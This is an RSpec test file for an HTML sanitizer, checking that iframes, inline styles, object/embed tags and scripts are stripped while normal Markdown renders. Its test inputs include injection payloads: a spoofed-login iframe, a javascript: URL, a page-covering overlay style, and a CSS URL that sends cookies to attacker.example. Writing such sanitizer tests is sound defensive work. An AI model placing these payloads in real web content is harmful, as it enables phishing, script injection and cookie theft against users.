require "rails_helper"

describe FpcFormatter do
  def render(source)
    described_class.render(source).to_s
  end

  describe "iframe is disallowed completely" do
    it "strips iframes pointing at YouTube" do
      html = '<p><iframe src="https://www.youtube.com/embed/abc123"></iframe></p>'
      output = render(html)
      expect(output).not_to include("<iframe")
      expect(output).not_to include("youtube.com")
    end

    it "strips iframes pointing at arbitrary hosts" do
      html = '<p><iframe src="https://attacker.example/login-spoof"></iframe></p>'
      output = render(html)
      expect(output).not_to include("attacker.example")
      expect(output).not_to include("<iframe")
    end

    it "strips iframes with non-http(s) src" do
      html = '<p><iframe src="javascript:alert(1)"></iframe></p>'
      expect(render(html)).not_to include("javascript:")
    end

    it "does not crash on iframes with a malformed src" do
      html = '<p><iframe src="not a uri"></iframe><iframe></iframe></p>'
      expect { render(html) }.not_to raise_error
      expect(render(html)).not_to include("<iframe")
    end
  end

  describe "style attribute" do
    it "strips inline style from paragraphs" do
      html = '<p style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff">x</p>'
      output = render(html)
      expect(output).to include("<p")
      expect(output).not_to include("position:fixed")
      expect(output).not_to include("style=")
    end

    it "strips inline style from divs" do
      html = '<div style="background-image:url(https://attacker.example/log?cookies)">x</div>'
      output = render(html)
      expect(output).not_to include("attacker.example")
      expect(output).not_to include("style=")
    end
  end

  describe "object / embed elements" do
    it "strips <object> tags" do
      html = '<object data="https://attacker.example/x.swf"></object>'
      output = render(html)
      expect(output).not_to include("<object")
      expect(output).not_to include("attacker.example")
    end

    it "strips <embed> tags" do
      html = '<embed src="https://attacker.example/x" />'
      output = render(html)
      expect(output).not_to include("<embed")
      expect(output).not_to include("attacker.example")
    end
  end

  describe "regular markdown still renders" do
    it "renders headers, emphasis, lists, and links" do
      source = <<~MD
        # Title

        Some *emphasis* and a [link](https://example.com).

        - one
        - two
      MD
      output = render(source)
      expect(output).to include("<h1")
      expect(output).to include("<em>emphasis</em>")
      expect(output).to include('href="https://example.com"')
      expect(output).to include("<li>one</li>")
    end

    it "renders inline HTML <a> tags" do
      output = render('<p>Visit <a href="https://example.com">our site</a>.</p>')
      expect(output).to include('href="https://example.com"')
    end

    it "strips inline <script>" do
      output = render("<p>hi <script>alert(1)</script></p>")
      expect(output).not_to include("<script")
    end
  end
end
